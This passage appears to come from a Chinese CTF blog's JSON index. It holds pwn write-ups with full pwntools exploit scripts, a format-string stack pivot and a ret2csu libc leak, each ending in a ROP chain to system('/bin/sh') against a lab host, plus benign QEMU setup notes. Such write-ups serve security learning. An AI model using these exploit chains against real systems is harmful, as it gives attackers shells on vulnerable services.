通过这个指令会将RBP的值赋给RSP，那么如果我们将栈中的RBP的值给修改了，运行到leave指令时，RSP就会转跳到我们指定的地址。\n所以，我们通过程序的写入功能，在堆上写入一个ROP链，使用格式化字符串的写入功能，改变RBP。然后利用leave指令，将栈迁移到ROP链的地址上。\n使用这个方法，我们需要先泄露libc的版本，找到基地址、system函数的地址和“/bin/sh”字符串的地址。\n在gdb中我们可以看到__libc_start_main函数的偏移量：\n偏移量为0xf+6=21。\n注：这里我们泄露出来的不是（______libc_start_main）而是（__libc_start_main+240）,所以泄露出来的地址需要减去240 from pwn import *\rcontext.log_level = \u0026#39;debug\u0026#39;\r#p = process(\u0026#39;format4\u0026#39;)\rp = remote(\u0026#39;10.0.25.109\u0026#39;,20004)\rpop_rdi_ret = 0x400c03\rdef add(payload):\rlenth = len(payload)\rp.recvuntil(\u0026#39;Exit.\u0026#39;)\rp.sendline(\u0026#39;1\u0026#39;)\rp.recvuntil(\u0026#39;Please enter your message length:\u0026#39;)\rp.sendline(str(lenth))\rp.recvuntil(\u0026#39;Please enter your Message:\u0026#39;)\rp.sendline(payload)\r#--------------------------------第一次输入--------------------------------------\rpayload = b\u0026#39;%21$p.tmp\u0026#39;\radd(payload)\rp.recvuntil(\u0026#39;Exit.\u0026#39;)\rp.sendline(\u0026#39;2\u0026#39;)\rp.recvuntil(\u0026#39;Message3: 0x\u0026#39;)\rleak = int(p.","title":"format4_new"},{"content":"首先查看保护机制：\n32位程序，开启了栈溢出保护和NX，可以修改got表\n然后我们运行程序，查看程序的内容：\n可以看到这个程序类似于建立通讯目录的功能，我们可以选择创建目录，溢出目录，编辑目录，展示目录，退出。\n根据我们经验，我们可以猜测，我们可以在创建目录里输入格式化字符串的payload，然后再展示目录时利用格式化字符串：\n然后我们在IDA中查看文件：\n这里我将每个函数都根据内容重新命名了，因为我们知道了展示目录的选项中有格式化字符串漏洞，所以我们进入show函数就可以找到这个全是printf函数的函数（这里我将其命名为printff）：\n现在，我们知道了格式化字符串，got表也是可以修改的，那么我们可以选择修改printf函数的got表为system函数了吗？\n答案是否定的，因为这个程序不仅在这里使用了printf函数，在其他的功能里都使用了printf函数，如果直接修改got，并不能保证程序会按照我们的意愿进入system函数。\n而且，在gdb调试中我们是可以看到，其实我们输入进程序的字符，并不是存在栈上的，而是存在于.bss段中，也就是堆中。\n所以这道题我们不能直接利用%n修改栈中的值来获得shell。\n那么我们可以换一个思路，首先利用程序，将在堆上构建一个虚假的栈，然后将函数ebp的值修改为虚假的栈的起始地址。\n1.利用程序创建目录的功能，在堆上写入一个虚假的栈。\r2.利用格式化字符串，修改函数的ebp\r3.当函数返回时，栈地址就会来到我们构建的虚假地址。 通过IDA我们可以看到程序并没有system函数和/bin/sh\n所以我们还是要泄露程序的libc版本：\nfrom pwn import *\rsh = process(\u0026#39;./format4\u0026#39;)\r#sh = remote(\u0026#39;10.0.25.109\u0026#39;,20004)\rcontact = ELF(\u0026#39;./format4\u0026#39;)\r#context.log_level = \u0026#39;debug\u0026#39;\r#通过创建目录选项，输入payload\rdef createcontact(name, phone, descrip_len, description):\rsh.recvuntil(\u0026#39;\u0026gt;\u0026gt;\u0026gt; \u0026#39;)\rsh.sendline(\u0026#39;1\u0026#39;)\rsh.recvuntil(\u0026#39;Contact info: \\n\u0026#39;)\rsh.recvuntil(\u0026#39;Name: \u0026#39;)\rsh.sendline(name)\rsh.recvuntil(\u0026#39;You have 10 numbers\\n\u0026#39;)\rsh.sendline(phone)\rsh.recvuntil(\u0026#39;Length of description: \u0026#39;)\rsh.sendline(descrip_len)\rsh.recvuntil(\u0026#39;description:\\n\\t\\t\u0026#39;)\rsh.sendline(description)\r#输入payload后利用printf函数展示结果\rdef printcontact():\rsh.recvuntil(\u0026#39;\u0026gt;\u0026gt;\u0026gt; \u0026#39;)\rsh.sendline(\u0026#39;4\u0026#39;)\rsh.recvuntil(\u0026#39;Contacts:\u0026#39;)\rsh.recvuntil(\u0026#39;Description: \u0026#39;)\rprintf = 0x08048BD1\r# get system addr \u0026amp; binsh_addr\rpayload = \u0026#39;%31$paaaa\u0026#39;\rcreatecontact(\u0026#39;1111\u0026#39;, \u0026#39;1111\u0026#39;, \u0026#39;111\u0026#39;, payload)\rprintcontact()\rlibc_start_main_ret = int(sh.recvuntil(\u0026#39;aaaa\u0026#39;, drop=True), 16)\rlog.success(\u0026#39;get libc_start_main_ret addr: \u0026#39; + hex(libc_start_main_ret))\rlibc_base = libc_start_main_ret - 0x1aee5\rsystem_addr = libc_base + 0x41790\rbinsh_addr = libc_base + 0x18e363\rlog.success(\u0026#39;get system addr: \u0026#39; + hex(system_addr))\rlog.success(\u0026#39;get binsh addr: \u0026#39; + hex(binsh_addr)) 这里我已经找到了libc的版本和system、bin_sh的偏移量。\n找到system函数和binsh字符的偏移量后我们需要将shellcode写入bss段，并且将其地址输出出来：\npayload = flat([\rsystem_addr,\r\u0026#39;bbbb\u0026#39;,\rbinsh_addr,\r\u0026#39;%6$p%11$pcccc\u0026#39;,\t//偏移量11为shellcode的bss段地址，偏移量6为ebp的位置\r]) payload = flat([\rsystem_addr,\r\u0026#39;bbbb\u0026#39;,\rbinsh_addr,\r\u0026#39;%6$p%11$pcccc\u0026#39;,\r])\rcreatecontact(\u0026#39;2222\u0026#39;, \u0026#39;2222\u0026#39;, \u0026#39;222\u0026#39;, payload)\rprintcontact()\rsh.recvuntil(\u0026#39;Description: \u0026#39;)\rdata = sh.recvuntil(\u0026#39;cccc\u0026#39;, drop=True)\rdata = data.split(b\u0026#39;0x\u0026#39;)\rprint(data)\r#ebp_addr = int(data[1], 16）\rheap_addr = int(data[2], 16)\r#log.success(\u0026#39;ebp_addr: \u0026#39; + hex(ebp_addr))\rlog.success(\u0026#39;heap_addr: \u0026#39; + hex(heap_addr)) 现在我们知道了shellcode在bss段的地址，那么我们接下来需要做的就是利用格式化字符串，修改返回函数的值：\npart1 = (heap_addr - 4) / 2\t//将heap_addr分为两个部分\rpart2 = heap_addr - 4 - part1\rpayload = \u0026#39;%\u0026#39; + str(part1) + \u0026#39;x%\u0026#39; + str(part2) + \u0026#39;x%6$n\u0026#39; 最终的exp为：\n#format4\rfrom pwn import *\r#sh = process(\u0026#39;./format4\u0026#39;)\rsh = remote(\u0026#39;10.0.25.109\u0026#39;,20004)\rcontact = ELF(\u0026#39;./format4\u0026#39;)\r#context.log_level = \u0026#39;debug\u0026#39;\rdef createcontact(name, phone, descrip_len, description):\rsh.recvuntil(\u0026#39;\u0026gt;\u0026gt;\u0026gt; \u0026#39;)\rsh.sendline(\u0026#39;1\u0026#39;)\rsh.recvuntil(\u0026#39;Contact info: \\n\u0026#39;)\rsh.recvuntil(\u0026#39;Name: \u0026#39;)\rsh.sendline(name)\rsh.recvuntil(\u0026#39;You have 10 numbers\\n\u0026#39;)\rsh.sendline(phone)\rsh.recvuntil(\u0026#39;Length of description: \u0026#39;)\rsh.sendline(descrip_len)\rsh.recvuntil(\u0026#39;description:\\n\\t\\t\u0026#39;)\rsh.sendline(description)\rdef printcontact():\rsh.recvuntil(\u0026#39;\u0026gt;\u0026gt;\u0026gt; \u0026#39;)\rsh.sendline(\u0026#39;4\u0026#39;)\rsh.recvuntil(\u0026#39;Contacts:\u0026#39;)\rsh.recvuntil(\u0026#39;Description: \u0026#39;)\r## get system addr \u0026amp; binsh_addr\rpayload = \u0026#39;%31$paaaa\u0026#39;\rcreatecontact(\u0026#39;1111\u0026#39;, \u0026#39;1111\u0026#39;, \u0026#39;111\u0026#39;, payload)\rprintcontact()\rlibc_start_main_ret = int(sh.recvuntil(\u0026#39;aaaa\u0026#39;, drop=True), 16)\rlog.success(\u0026#39;get libc_start_main_ret addr: \u0026#39; + hex(libc_start_main_ret))\rlibc_base = libc_start_main_ret - 0x18647\rsystem_addr = libc_base + 0x3a950\rbinsh_addr = libc_base + 0x15912b\rlog.success(\u0026#39;get libc_base : \u0026#39; + hex(libc_base))\rlog.success(\u0026#39;get system addr: \u0026#39; + hex(system_addr))\rlog.success(\u0026#39;get binsh addr: \u0026#39; + hex(binsh_addr))\r##gdb.attach(sh)\r#--------------------------------第二次输入--------------------------------------\r## get heap addr and ebp addr\rpayload = flat([\rsystem_addr,\r\u0026#39;bbbb\u0026#39;,\rbinsh_addr,\r\u0026#39;%6$p%11$pcccc\u0026#39;,\r])\rcreatecontact(\u0026#39;2222\u0026#39;, \u0026#39;2222\u0026#39;, \u0026#39;222\u0026#39;, payload)\rprintcontact()\rsh.recvuntil(\u0026#39;Description: \u0026#39;)\rdata = sh.recvuntil(\u0026#39;cccc\u0026#39;, drop=True)\rdata = data.split(b\u0026#39;0x\u0026#39;)\rprint(data)\rebp_addr = int(data[1], 16)\rheap_addr = int(data[2], 16)\r#--------------------------------第三次输入--------------------------------------\r\u0026#39;\u0026#39;\u0026#39;\r## modify ebp\rpart1 = (heap_addr - 4) / 2\rpart2 = heap_addr - 4 - part1\rpayload = \u0026#39;%\u0026#39; + str(part1) + \u0026#39;x%\u0026#39; + str(part2) + \u0026#39;x%6$n\u0026#39;\r##print payload\rcreatecontact(\u0026#39;3333\u0026#39;, \u0026#39;123456789\u0026#39;, \u0026#39;300\u0026#39;, payload)\rprintcontact()\rsh.recvuntil(\u0026#39;Description: \u0026#39;)\rsh.recvuntil(\u0026#39;Description: \u0026#39;)\r##gdb.attach(sh)\rprint(\u0026#39;get shell\u0026#39;)\rsh.recvuntil(\u0026#39;\u0026gt;\u0026gt;\u0026gt; \u0026#39;)\r##get shell\rsh.sendline(\u0026#39;5\u0026#39;)\r\u0026#39;\u0026#39;\u0026#39;\rsh.interactive() ","permalink":"https://jellyfish-pro.github.io/ctf/format4_old/","summary":"首先查看保护机制：\n32位程序，开启了栈溢出保护和NX，可以修改got表\n然后我们运行程序，查看程序的内容：\n可以看到这个程序类似于建立通讯目录的功能，我们可以选择创建目录，溢出目录，编辑目录，展示目录，退出。\n根据我们经验，我们可以猜测，我们可以在创建目录里输入格式化字符串的payload，然后再展示目录时利用格式化字符串：\n然后我们在IDA中查看文件：\n这里我将每个函数都根据内容重新命名了，因为我们知道了展示目录的选项中有格式化字符串漏洞，所以我们进入show函数就可以找到这个全是printf函数的函数（这里我将其命名为printff）：\n现在，我们知道了格式化字符串，got表也是可以修改的，那么我们可以选择修改printf函数的got表为system函数了吗？\n答案是否定的，因为这个程序不仅在这里使用了printf函数，在其他的功能里都使用了printf函数，如果直接修改got，并不能保证程序会按照我们的意愿进入system函数。\n而且，在gdb调试中我们是可以看到，其实我们输入进程序的字符，并不是存在栈上的，而是存在于.bss段中，也就是堆中。\n所以这道题我们不能直接利用%n修改栈中的值来获得shell。\n那么我们可以换一个思路，首先利用程序，将在堆上构建一个虚假的栈，然后将函数ebp的值修改为虚假的栈的起始地址。\n1.利用程序创建目录的功能，在堆上写入一个虚假的栈。\r2.利用格式化字符串，修改函数的ebp\r3.当函数返回时，栈地址就会来到我们构建的虚假地址。 通过IDA我们可以看到程序并没有system函数和/bin/sh\n所以我们还是要泄露程序的libc版本：\nfrom pwn import *\rsh = process(\u0026#39;./format4\u0026#39;)\r#sh = remote(\u0026#39;10.0.25.109\u0026#39;,20004)\rcontact = ELF(\u0026#39;./format4\u0026#39;)\r#context.log_level = \u0026#39;debug\u0026#39;\r#通过创建目录选项，输入payload\rdef createcontact(name, phone, descrip_len, description):\rsh.recvuntil(\u0026#39;\u0026gt;\u0026gt;\u0026gt; \u0026#39;)\rsh.sendline(\u0026#39;1\u0026#39;)\rsh.recvuntil(\u0026#39;Contact info: \\n\u0026#39;)\rsh.recvuntil(\u0026#39;Name: \u0026#39;)\rsh.sendline(name)\rsh.recvuntil(\u0026#39;You have 10 numbers\\n\u0026#39;)\rsh.sendline(phone)\rsh.recvuntil(\u0026#39;Length of description: \u0026#39;)\rsh.sendline(descrip_len)\rsh.recvuntil(\u0026#39;description:\\n\\t\\t\u0026#39;)\rsh.sendline(description)\r#输入payload后利用printf函数展示结果\rdef printcontact():\rsh.recvuntil(\u0026#39;\u0026gt;\u0026gt;\u0026gt; \u0026#39;)\rsh.sendline(\u0026#39;4\u0026#39;)\rsh.recvuntil(\u0026#39;Contacts:\u0026#39;)\rsh.recvuntil(\u0026#39;Description: \u0026#39;)\rprintf = 0x08048BD1\r# get system addr \u0026amp; binsh_addr\rpayload = \u0026#39;%31$paaaa\u0026#39;\rcreatecontact(\u0026#39;1111\u0026#39;, \u0026#39;1111\u0026#39;, \u0026#39;111\u0026#39;, payload)\rprintcontact()\rlibc_start_main_ret = int(sh.","title":"format4_old"},{"content":"设置桥接的命令：\nsudo ifconfig ens33 down # 先停用host的网卡\rsudo brctl addbr br0 # 添加名为br0的网桥\rsudo brctl addif br0 ens33 # 将host的网卡插到网桥br0上\rsudo brctl stp br0 off # 如果只有一个网桥，则关闭生成树协议\rsudo ifconfig br0 0.0.0.0 promisc up # 启用br0网桥，不分配ip，混杂模式\rsudo ifconfig ens33 0.0.0.0 promisc up # 启用host网卡，不分配ip，混杂模式\rsudo dhclient br0 # 让网桥从dhcp获取ip\rsudo tunctl -t tap0 # 创建一个tap网络设备，名字为tap0\rsudo brctl addif br0 tap0 # 将tap0插到网桥\rsudo ifconfig tap0 0.0.0.0 promisc up # 启用tap0，不分配ip，混杂模式 启动qemu-system的命令：\nsudo qemu-system-mipsel -M malta -m 512 \\\r-kernel vmlinux-3.2.0-4-4kc-malta-x86 \\\r-hda debian_wheezy_mipsel_standard.qcow2 \\\r-append \u0026#34;root=/dev/sda1 console=ttyS0\u0026#34; \\\r-net nic,macaddr=00:19:3e:00:00:01 -nographic -net nic -net tap,ifname=tap0,script=no,downscript=no -kernel 指定内核版本\n-hda 指定硬盘文件\n-nographic 不适用GUI模式\n-net nic -net tap,ifname=tap0,script=no,downscript=no 使用上面设置的网卡\n","permalink":"https://jellyfish-pro.github.io/note/qemu-system%E6%A1%A5%E6%8E%A5%E8%AE%BE%E7%BD%AE/","summary":"设置桥接的命令：\nsudo ifconfig ens33 down # 先停用host的网卡\rsudo brctl addbr br0 # 添加名为br0的网桥\rsudo brctl addif br0 ens33 # 将host的网卡插到网桥br0上\rsudo brctl stp br0 off # 如果只有一个网桥，则关闭生成树协议\rsudo ifconfig br0 0.0.0.0 promisc up # 启用br0网桥，不分配ip，混杂模式\rsudo ifconfig ens33 0.0.0.0 promisc up # 启用host网卡，不分配ip，混杂模式\rsudo dhclient br0 # 让网桥从dhcp获取ip\rsudo tunctl -t tap0 # 创建一个tap网络设备，名字为tap0\rsudo brctl addif br0 tap0 # 将tap0插到网桥\rsudo ifconfig tap0 0.0.0.0 promisc up # 启用tap0，不分配ip，混杂模式 启动qemu-system的命令：","title":"qemu-system桥接设置"},{"content":"在ubuntu上直接使用 sudo apt install qemu安装qemu时，会遇到因为qemu版本过低导致模拟环境出现问题（例如：二进制文件是32位，但是在模拟出的环境中二进制文件的地址是8字节的情况）\n为了避免这种情况，我们需要放弃apt安装，转而选择自行编译高版本的qemu。\n我们可以在git的官网上下载最新版本的源码，或者在[仓库](Index of / (qemu.org))中寻找之前的版本，亦或者是在[官方的gitlab](QEMU / QEMU · GitLab)上寻找想要的版本\n当我们拿到源码后，先安装依赖\nsudo apt build-dep qemu 而后进入qemu源码文件夹进行配置：\n./configure \\\r--prefix= ~/qemu-user-static \\ #这个选项是指定安装位置，我是直接安装到home目录下\r--static \\ #指示静态链接\r--disable-system \\ #不编译系统仿真程序\r--enable-linux-user #编译所有架构的用户态仿真程序 注意：\n静态编译的时候需要指定\u0026ndash;disable-system选项，因为带softmmu 后缀的编译目标（即系统仿真程序）无论如何都会用到一些共享库，因此如果在指定了\u0026ndash;static选项但没有指定\u0026ndash;disable-system选项会导致后面的链接阶段报错。\n编译，安装：\nmake\rmake install 最后给所有编译得到的目标重命名，为其添加一个\u0026quot;-static\u0026quot;后缀，这样qemu-debootstrap可以识别：\ncd qemu-user-static/bin\rfor i in *; do cp $i $i-static; done ","permalink":"https://jellyfish-pro.github.io/note/qemu%E7%BC%96%E8%AF%91/","summary":"在ubuntu上直接使用 sudo apt install qemu安装qemu时，会遇到因为qemu版本过低导致模拟环境出现问题（例如：二进制文件是32位，但是在模拟出的环境中二进制文件的地址是8字节的情况）\n为了避免这种情况，我们需要放弃apt安装，转而选择自行编译高版本的qemu。\n我们可以在git的官网上下载最新版本的源码，或者在[仓库](Index of / (qemu.org))中寻找之前的版本，亦或者是在[官方的gitlab](QEMU / QEMU · GitLab)上寻找想要的版本\n当我们拿到源码后，先安装依赖\nsudo apt build-dep qemu 而后进入qemu源码文件夹进行配置：\n./configure \\\r--prefix= ~/qemu-user-static \\ #这个选项是指定安装位置，我是直接安装到home目录下\r--static \\ #指示静态链接\r--disable-system \\ #不编译系统仿真程序\r--enable-linux-user #编译所有架构的用户态仿真程序 注意：\n静态编译的时候需要指定\u0026ndash;disable-system选项，因为带softmmu 后缀的编译目标（即系统仿真程序）无论如何都会用到一些共享库，因此如果在指定了\u0026ndash;static选项但没有指定\u0026ndash;disable-system选项会导致后面的链接阶段报错。\n编译，安装：\nmake\rmake install 最后给所有编译得到的目标重命名，为其添加一个\u0026quot;-static\u0026quot;后缀，这样qemu-debootstrap可以识别：\ncd qemu-user-static/bin\rfor i in *; do cp $i $i-static; done ","title":"qemu编译"},{"content":"首先利用checksec命令查看保护机制：\n64位，没有canary检测，没有地址随机化，got表可写。\n然后放进IDA里进行看一下反编译：\n我们可以看到plt表中调用的是write函数。\n这样我们就可以通过write函数泄露函数地址：\n64位同样需要我们构造gadget。\n我们利用pwntools的ROPgadget指令查找gadget：\nROPgadget --binary format_base --only \u0026#39;pop|ret\u0026#39; 我们知道write函数需要传递三个参数，但是通过上图，我们发现我们只能传递两个参数。\n如果不能保证参数个数，那么我们就不能保证函数掉用的成功率。\n所以这时候我们又需要利用到_libc_csu_init函数了,这个函数是程序调用libc库时用来对程序进行初始化的函数，一般先于main函数执行，因此只要是动态链接程序，基本都会有这个函数。\n_libc_csu_init函数因为特殊的汇编构造，可以帮助我们调用三个参数的函数。\n首先我们看到这个函数的汇编代码（这里的汇编代码并不是题目的汇编代码，题目可能会和这里给出的有所差别，但是原理是一样的）：\n这个函数的汇编中有这样一段。上面说到我们需要rdi，rsi，rdx，我们可以通过上半部分的mov指令将数据传从r13 r14 r15里传给rdx rsi rdi，而下半部分的一连串pop指令可以把数据给rbx rbp r12 r13 r14 r15。\n将参数传给rdi rsi rdx后，我们可以通过上半部分的call指令调用我们需要的函数，因为调用的地址是[r12 +rbx*8]，所以将函数地址存入r12中，再将rbx存入0就可以调用需要的函数了。\n.text:0000000000400616 add rsp, 8\r.text:000000000040061A pop rbx\t//设定为0\r.text:000000000040061B pop rbp\t//设定为1\r.text:000000000040061C pop r12\t//放入需要调用的函数地址\r.text:000000000040061E pop r13\t//放入第三个参数\r.text:0000000000400620 pop r14\t//放入第二个参数\r.text:0000000000400622 pop r15\t//放入第三个参数\r.text:0000000000400624 retn\t//返回到0x400600\r.text:0000000000400600 mov rdx, r13\t//第三个参数放入rdx\r.text:0000000000400603 mov rsi, r14\t//第二个参数放入rsi\r.text:0000000000400606 mov edi, r15d\t//第一个参数放入rdi\r.text:0000000000400609 call qword ptr [r12+rbx*8]//因为rbx为0，所以只有r12\r.text:000000000040060D add rbx, 1\t//rbx为0，加1为1\r.text:0000000000400611 cmp rbx, rbp\t//rbx与rbp相等。不会跳转\r.text:0000000000400614 jnz short loc_400600//继续执行下面到ret\r.text:0000000000400616 add rsp, 8\r.text:000000000040061A pop rbx\t//填充8个无效字符\r.text:000000000040061B pop rbp\t//填充8个无效字符\r.text:000000000040061C pop r12\t//填充8个无效字符\r.text:000000000040061E pop r13\t//填充8个无效字符\r.text:0000000000400620 pop r14\t//填充8个无效字符\r.text:0000000000400622 pop r15\t//填充8个无效字符\r.text:0000000000400624 retn\t//返回到任意想要返回的地址 然后是我们题目利用_libc_csu_init函数的payload：\nrbx = 0\t//rbx置零，方便跳转\rrbp = 1\t//rbp置一，方便跳转\rr12 = write_addr\t//需要调用的函数\rr13 = 1\t//write函数第一个参数，不为0即可\rr14 = libc_addr\t//第二个参数，需要打印的字符串地址\rr15 = 8\t//第三个参数，打印八个字节\rpayload = b\u0026#39;a\u0026#39;*136 //padding\rpayload += p64(pop_addr)\t//_libc_csu_init函数需要我们利用的地址\rpayload += p64(rbx)\rpayload += p64(rbp)\rpayload += p64(r12) payload += p64(r13)\rpayload += p64(r14)\rpayload += p64(r15)\rpayload += p64(move_addr)\t//将参数送入寄存器的地址 payload += b\u0026#39;a\u0026#39;*(0x8+8*6)\t//重新布局\rpayload += p64(main_addr)\t//返回主函数，再来一遍 泄露函数的exp为：\nfrom pwn import *\rcontext.log_level = \u0026#39;debug\u0026#39;\r#p = process(\u0026#39;./ret2csuinit\u0026#39;)\rp = remote(\u0026#39;10.0.25.109\u0026#39;,10008)\relf = ELF(\u0026#39;./ret2csuinit\u0026#39;)\rlibc_addr = elf.got[\u0026#39;__libc_start_main\u0026#39;]\rread_addr = elf.got[\u0026#39;read\u0026#39;]\rwrite_addr = elf.got[\u0026#39;write\u0026#39;]\rbss_addr = elf.bss()\rmain_addr = 0x4006FB\rpop_addr = 0x40077A\rmove_addr = 0x400760\rrbx = 0\rrbp = 1\rr12 = write_addr\rr13 = 1\rr14 = libc_addr\rr15 = 8\rpayload = b\u0026#39;a\u0026#39;*136 + p64(pop_addr) + p64(rbx)+ p64(rbp)+ p64(r12) + p64(r13)\rpayload += p64(r14)+ p64(r15)+ p64(move_addr) +b\u0026#39;a\u0026#39;*(0x8+8*6)+ p64(main_addr)\rp.recvuntil(\u0026#39;game!\u0026#39;)\rp.sendline(payload)\rleak = u64(p.recvuntil(\u0026#39;\\x7f\u0026#39;)[-6:].ljust(8,b\u0026#39;\\x00\u0026#39;)) 同样是查找libc版本：\n找到system函数和/bin/sh的偏移量后，就可以了：\n#ret2csuinit_x64\rfrom pwn import *\rcontext.log_level = \u0026#39;debug\u0026#39;\r#p = process(\u0026#39;./ret2csuinit\u0026#39;)\rp = remote(\u0026#39;10.0.25.109\u0026#39;,10008)\relf = ELF(\u0026#39;./ret2csuinit\u0026#39;)\rlibc_addr = elf.got[\u0026#39;__libc_start_main\u0026#39;]\rread_addr = elf.got[\u0026#39;read\u0026#39;]\rwrite_addr = elf.got[\u0026#39;write\u0026#39;]\rbss_addr = elf.bss()\rmain_addr = 0x4006FB\rpop_addr = 0x40077A\rmove_addr = 0x400760\rrbx = 0\rrbp = 1\rr12 = write_addr\rr13 = 1\rr14 = libc_addr\rr15 = 8\rpayload = b\u0026#39;a\u0026#39;*136 + p64(pop_addr) + p64(rbx)+ p64(rbp)+ p64(r12) + p64(r13)\rpayload += p64(r14)+ p64(r15)+ p64(move_addr) +b\u0026#39;a\u0026#39;*(0x8+8*6)+ p64(main_addr)\rp.recvuntil(\u0026#39;game!\u0026#39;)\rp.sendline(payload)\rleak = u64(p.recvuntil(\u0026#39;\\x7f\u0026#39;)[-6:].ljust(8,b\u0026#39;\\x00\u0026#39;))\rprint(\u0026#39;leak =\u0026#39;,hex(leak))\rlibc_base = leak - 0x23fc0\rsys_addr = libc_base + 0x522c0\rbin_addr = libc_base + 0x1b45bd libc_base = leak - 0x20750\rsys_addr = libc_base + 0x453a0\rbin_addr = libc_base + 0x18ce57\rprint(\u0026#39;libc_base =\u0026#39;, hex(libc_base))\rprint(\u0026#39;sys_addr =\u0026#39;, hex(sys_addr))\rprint(\u0026#39;bin_addr =\u0026#39;, hex(bin_addr))\r#-----------------------------第二次payload---------------------------------\rpop_rdi_ret = 0x400783\rpayload2 = b\u0026#39;a\u0026#39;*136 + p64(pop_rdi_ret) + p64(bin_addr) + p64(sys_addr)\rp.recvuntil(\u0026#39;game!\u0026#39;)\rp.sendline(payload2)\rp.interactive() ","permalink":"https://jellyfish-pro.github.io/ctf/ret2csuinit_new/","summary":"首先利用checksec命令查看保护机制：\n64位，没有canary检测，没有地址随机化，got表可写。\n然后放进IDA里进行看一下反编译：\n我们可以看到plt表中调用的是write函数。\n这样我们就可以通过write函数泄露函数地址：\n64位同样需要我们构造gadget。\n我们利用pwntools的ROPgadget指令查找gadget：\nROPgadget --binary format_base --only \u0026#39;pop|ret\u0026#39; 我们知道write函数需要传递三个参数，但是通过上图，我们发现我们只能传递两个参数。\n如果不能保证参数个数，那么我们就不能保证函数掉用的成功率。\n所以这时候我们又需要利用到_libc_csu_init函数了,这个函数是程序调用libc库时用来对程序进行初始化的函数，一般先于main函数执行，因此只要是动态链接程序，基本都会有这个函数。\n_libc_csu_init函数因为特殊的汇编构造，可以帮助我们调用三个参数的函数。\n首先我们看到这个函数的汇编代码（这里的汇编代码并不是题目的汇编代码，题目可能会和这里给出的有所差别，但是原理是一样的）：\n这个函数的汇编中有这样一段。上面说到我们需要rdi，rsi，rdx，我们可以通过上半部分的mov指令将数据传从r13 r14 r15里传给rdx rsi rdi，而下半部分的一连串pop指令可以把数据给rbx rbp r12 r13 r14 r15。\n将参数传给rdi rsi rdx后，我们可以通过上半部分的call指令调用我们需要的函数，因为调用的地址是[r12 +rbx*8]，所以将函数地址存入r12中，再将rbx存入0就可以调用需要的函数了。\n.text:0000000000400616 add rsp, 8\r.text:000000000040061A pop rbx\t//设定为0\r.text:000000000040061B pop rbp\t//设定为1\r.text:000000000040061C pop r12\t//放入需要调用的函数地址\r.text:000000000040061E pop r13\t//放入第三个参数\r.text:0000000000400620 pop r14\t//放入第二个参数\r.text:0000000000400622 pop r15\t//放入第三个参数\r.text:0000000000400624 retn\t//返回到0x400600\r.text:0000000000400600 mov rdx, r13\t//第三个参数放入rdx\r.text:0000000000400603 mov rsi, r14\t//第二个参数放入rsi\r.","title":"ret2csuinit_new"},{"content":"首先查看具体信息：\n在程序中也没有system和/bin/sh\n栈也不是可读可写可执行。\n那我们选择通过泄露函数地址，来查找libc版本：\n那么问题又来了，这个程序没有puts函数，只有write函数，需要3个参数，而在x64我们需要用到rdi，rsi，rdx，而在程序中我们并没有找到pop_rdx。\n这时候我们就需要利用到_libc_csu_init函数了,这个函数是程序调用libc库时用来对程序进行初始化的函数，一般先于main函数执行，因此只要是动态链接程序，基本都会有这个函数。\n首先我们看到这个函数的汇编代码：\n这个函数的汇编中有这样一段。上面说到我们需要rdi，rsi，rdx，我们可以通过上半部分的mov指令将数据传从r13 r14 r15里传给rdx rsi rdi，而下半部分的一连串pop指令可以把数据给rbx rbp r12 r13 r14 r15。\n将参数传给rdi rsi rdx后，我们可以通过上半部分的call指令调用我们需要的函数，因为调用的地址是[r12 +rbx*8]，所以将函数地址存入r12中，再将rbx存入0就可以调用需要的函数了。\n.text:0000000000400616 add rsp, 8\r.text:000000000040061A pop rbx\t//设定为0\r.text:000000000040061B pop rbp\t//设定为1\r.text:000000000040061C pop r12\t//放入需要调用的函数地址\r.text:000000000040061E pop r13\t//放入第三个参数\r.text:0000000000400620 pop r14\t//放入第二个参数\r.text:0000000000400622 pop r15\t//放入第三个参数\r.text:0000000000400624 retn\t//返回到0x400600\r.text:0000000000400600 mov rdx, r13\t//第三个参数放入rdx\r.text:0000000000400603 mov rsi, r14\t//第二个参数放入rsi\r.text:0000000000400606 mov edi, r15d\t//第一个参数放入rdi\r.text:0000000000400609 call qword ptr [r12+rbx*8]//因为rbx为0，所以只有r12\r.text:000000000040060D add rbx, 1\t//rbx为0，加1为1\r.text:0000000000400611 cmp rbx, rbp\t//rbx与rbp相等。不会跳转\r.text:0000000000400614 jnz short loc_400600//继续执行下面到ret\r.text:0000000000400616 add rsp, 8\r.text:000000000040061A pop rbx\t//填充8个无效字符\r.text:000000000040061B pop rbp\t//填充8个无效字符\r.text:000000000040061C pop r12\t//填充8个无效字符\r.text:000000000040061E pop r13\t//填充8个无效字符\r.text:0000000000400620 pop r14\t//填充8个无效字符\r.text:0000000000400622 pop r15\t//填充8个无效字符\r.text:0000000000400624 retn\t//返回到任意想要返回的地址 所以payload就为：\npayload = b\u0026#39;A\u0026#39;*136 payload += p64(pop_6_addr) //让主程序跳到0x40061A，开始布置参数传递\rpayload += p64(0) + p64(1) //rbx=0，rbp=1\rpayload += p64(write_got) //将需要调用的函数地址给r12\rpayload += p64(8)\t//将8给r13，表示让write函数输出8个字符，准备传给rdx\rpayload += p64(write_got) //将write的地址给r14，准备传给rsi\rpayload += p64(1) //将1给r15，准备传给rdi\rpayload += p64(mov_addr) //ret返回到0x400600\rpayload += b\u0026#39;a\u0026#39;*(0x8+8*6) //重新填充rbx rbp r13 r14 r15\rpayload += p64(main_addr)\t//返回主函数 将栈这样布置，就可以通过write函数泄露write的地址了：\n通过后12位地址，我们就可以找到对应的libc版本：\n然后通过这个libc查询到对应的system函数地址和/bin/sh的偏移量。\n接下来我们直接像libc3那道题一样添加填充，然后利用gadget将/bin/sh的地址放入rdi，然后调用system函数就好了：\npayload2 = b\u0026#39;A\u0026#39;*136 + p64(pop_rdi_ret) + p64(bin_addr) + p64(sys_addr) #ret2csuinit\rfrom pwn import *\r#p = process(\u0026#39;./ret2csuinit\u0026#39;)\rp = remote(\u0026#39;10.0.25.109\u0026#39;,10008)\relf = ELF(\u0026#39;./ret2csuinit\u0026#39;)\rlibc = ELF(\u0026#39;./libc.so.62\u0026#39;)\r#context.log_level = \u0026#39;debug\u0026#39;\rpop_6_addr = 0x40061a\rwrite_plt = elf.plt[\u0026#39;write\u0026#39;]\rwrite_got = elf.got[\u0026#39;write\u0026#39;]\rmov_addr = 0x400600\rmain_addr = elf.symbols[\u0026#39;main\u0026#39;]\rread_got = elf.got[\u0026#39;read\u0026#39;]\rbuf_addr = 0x601000\rpop_rdi_ret = 0x400623\rpayload = b\u0026#39;A\u0026#39;*136 + p64(pop_6_addr) + p64(0) + p64(1) + 